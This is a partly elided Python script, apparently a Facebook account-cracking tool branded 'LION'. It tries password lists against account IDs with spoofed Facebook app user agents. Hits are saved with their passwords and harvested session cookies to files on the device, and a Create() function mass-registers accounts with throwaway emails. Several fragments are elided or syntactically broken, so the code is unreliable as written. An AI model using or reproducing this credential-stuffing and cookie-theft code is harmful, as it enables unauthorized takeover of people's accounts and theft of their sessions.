...
usr=[]
try:
    xd=requests.get('https://github.com/afglion5/UE/blob/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
...
def gmail():
 ...
 #_______________________File-method-1_________________#
def api1(ids,names,passlist):
        try:
            ...
            for pw in passlist:
                ...
                ua = "[FBAN/Orca-Android;FBAV/445.0.0.34.118;FBBV/448014984;FBPN/com.facebook.katana;FBLC/en_US;FBBV/38150827;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X688B;FBSV/7.1.2;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,height=,width=;FB_FW/1;]"
                li = ['28','29','210']
            ...
            pass
 #_______________________File-method-2_________________#
#m2
#b-graph method        
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [𝐋𝐈𝐎𝐍-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/101.0.0.45.101;FBBV/826496547;FBDM/{density=3.5,width=1241,height=2503};FBLC/ko_KR;FBCR/T-Mobile;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/Huawei Mate 20;FBSV/11.1.1;nullFBCA/arm64-v8a:;]"
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [𝐋𝐈𝐎𝐍-𝗢𝗞] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [LION-CP] '+ids+' | '+pas+'\033[1;97m')
  ...
  #__________________Random-method__________________#        
                ...
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [LION-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                    
                                        open('/sdcard/LION/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/LION/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [LION-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AFG/LION-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def Create():
    ...
    def strt():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [LION-CREATE] OK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 print("\r\r\033[1;32m [LION-OK] "+uid+'|'+pas+'|'+coki)
                 linex()
                 ok+=1
                 open("/sdcard/LION/AUTO-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
